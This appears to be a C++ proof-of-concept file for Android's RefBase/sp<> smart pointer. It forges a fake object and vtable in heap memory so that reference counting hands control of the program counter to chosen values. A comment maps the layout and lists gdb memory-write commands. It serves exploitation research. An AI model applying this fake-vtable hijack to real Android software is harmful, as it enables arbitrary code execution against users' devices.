#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <utils/RefBase.h>
      
using  namespace android;

class LightClass : public RefBase
{
public:
	LightClass() 
	{
		printf("Construct LightClass Object.\n");
	}

	virtual ~LightClass() 
	{
		printf("Destory LightClass Object.\n");
	}

	void lightPrint(){
	    printf("ligntPrint..\n");
	    return;
	}
};

class Test{
    public:
    void t(){
        printf("Test::t\n");
        return;
    }
};

int main(int argc, char** argv) 
{
	printf("Init sp stuff..");
	LightClass* pLightClass = new LightClass();

    /*
	printf("Invoking copy ctor..");
	sp<LightClass> lpOut = pLightClass;
    lpOut -> lightPrint();
    */

	void *a = malloc(80);
	*((unsigned long *)a) = (unsigned long)a + 24;
	*((unsigned long *)a + 1) = (unsigned long)a + 16;     //long is 64 bit, need to type cast a before assignment
	*((unsigned long *)a + 2) = 0x10000000;
    *((unsigned long *)a + 3) = (unsigned long)a + 40;
    *((unsigned long *)a + 5) = (unsigned long)a + 48;
    *((unsigned long *)a + 6) = 0x6161616161616161;
    *((unsigned long *)a + 8) = 0xdeadbeefdeadbeef;
    pLightClass = a;
    sp<LightClass> lpPoC = pLightClass;

	printf("a : %p\n",a);

	printf("Light Ref Count: %d.\n", pLightClass->getStrongCount());
	return 0;
}

/*
POC: *(addr)
addr:       addr+24 (vptr)
addr+8 :    addr + 16       <- mrefs
addr+16 :   0x10000000      <- x19
addr+24 :   ...(vtable)
addr+32 :
addr+40 :   addr + 48
addr+48 :   0xdeadbeef

addr+64 :   0xcafebabe      <-pc! ldr x9, [x8, #16] ; blr	x9

set *(0x7fb7b55000)=0xb7b55000+24
set *(0x7fb7b55000+4)=0x7f

set *(0x7fb7b55000+8)=0xb7b55000+16
set *(0x7fb7b55000+12)=0x7f

set *(0x7fb7b55000+16)=0x10000000

set *(0x7fb7b55000+24)=0xb7b55000+40
set *(0x7fb7b55000+28)=0x7f

set *(0x7fb7b55000+40)=0xb7b55000+48
set *(0x7fb7b55000+44)=0x7f

set *(0x7fb7b55000+48)=0x61616161
set *(0x7fb7b55000+52)=0x61616161

set *(0x7fb7b55000+64)=0x61616161
set *(0x7fb7b55000+68)=0x61616161
*/
